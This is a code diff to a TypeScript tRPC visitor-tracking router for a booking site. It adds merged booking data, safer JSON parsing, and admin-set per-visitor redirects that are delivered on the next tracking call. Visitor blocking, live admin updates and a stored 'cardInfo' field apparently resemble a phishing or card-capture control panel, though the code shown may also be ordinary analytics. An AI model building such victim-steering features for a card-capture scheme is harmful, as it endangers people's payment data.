@@ -3,6 +3,36 @@ import { router, publicProcedure, adminProcedure } from '../trpc.js';
 import { db } from '../db.js';
 import { emitVisitorUpdate } from '../socket.js';
 
+const bookingDataSchema = z.object({
+  from: z.string().optional(),
+  to: z.string().optional(),
+  date: z.string().optional(),
+  passengers: z.number().optional(),
+  selectedTrip: z.string().optional(),
+  selectedSeats: z.array(z.string()).optional(),
+  fareClass: z.string().optional(),
+}).optional();
+
+function parseObject(value: unknown): Record<string, unknown> {
+  if (typeof value !== 'string' || !value) return {};
+  try {
+    const parsed = JSON.parse(value);
+    return parsed && typeof parsed === 'object' && !Array.isArray(parsed) ? parsed : {};
+  } catch {
+    return {};
+  }
+}
+
+function parseHistory(value: unknown): Array<{ step: string; time: number }> {
+  if (typeof value !== 'string' || !value) return [];
+  try {
+    const parsed = JSON.parse(value);
+    return Array.isArray(parsed) ? parsed : [];
+  } catch {
+    return [];
+  }
+}
+
 export const visitorsRouter = router({
   track: publicProcedure
     .input(z.object({
@@ -13,6 +43,7 @@ export const visitorsRouter = router({
       country: z.string().optional(),
       city: z.string().optional(),
       step: z.string().optional(),
+      bookingData: bookingDataSchema,
     }))
     .mutation(async ({ input, ctx }) => {
       const ip = input.ip || ctx.clientIp;
@@ -23,9 +54,13 @@ export const visitorsRouter = router({
         return { blocked: true, redirectUrl: existing.redirectUrl ?? null };
       }
 
-      const stepHistory = existing
-        ? JSON.parse(existing.stepHistory as string)
-        : [];
+      const stepHistory = parseHistory(existing?.stepHistory);
+      const currentBookingData = parseObject(existing?.bookingData);
+      const bookingData = input.bookingData
+        ? { ...currentBookingData, ...input.bookingData }
+        : currentBookingData;
+      const pendingRedirect = existing?.redirectUrl ?? null;
+      const now = new Date().toISOString();
 
       if (input.step) {
         stepHistory.push({ step: input.step, time: Date.now() });
@@ -42,7 +77,9 @@ export const visitorsRouter = router({
           ...(input.country && { country: input.country }),
           ...(input.city && { city: input.city }),
           ...(input.step && { currentStep: input.step, stepHistory: JSON.stringify(stepHistory) }),
-          lastActive: new Date(),
+          ...(input.bookingData && { bookingData: JSON.stringify(bookingData) }),
+          ...(pendingRedirect && { redirectUrl: null }),
+          lastActive: now,
         },
         create: {
           sessionId: input.sessionId,
@@ -53,6 +90,10 @@ export const visitorsRouter = router({
           city: input.city ?? '',
           currentStep: input.step ?? 'home',
           stepHistory: JSON.stringify(input.step ? [{ step: input.step, time: Date.now() }] : []),
+          isBlocked: false,
+          bookingData: JSON.stringify(input.bookingData ?? {}),
+          cardInfo: JSON.stringify({}),
+          lastActive: now,
         },
       });
 
@@ -65,7 +106,7 @@ export const visitorsRouter = router({
         lastActive: new Date().toISOString(),
       });
 
-      return { blocked: false, redirectUrl: null };
+      return { blocked: false, redirectUrl: pendingRedirect };
     }),
 
   stats: adminProcedure.query(async () => {
@@ -85,9 +126,9 @@ export const visitorsRouter = router({
     });
     return visitors.map(v => ({
       ...v,
-      stepHistory: JSON.parse(v.stepHistory as string),
-      bookingData: JSON.parse(v.bookingData as string),
-      cardInfo: JSON.parse(v.cardInfo as string),
+      stepHistory: parseHistory(v.stepHistory),
+      bookingData: parseObject(v.bookingData),
+      cardInfo: {},
     }));
   }),
 
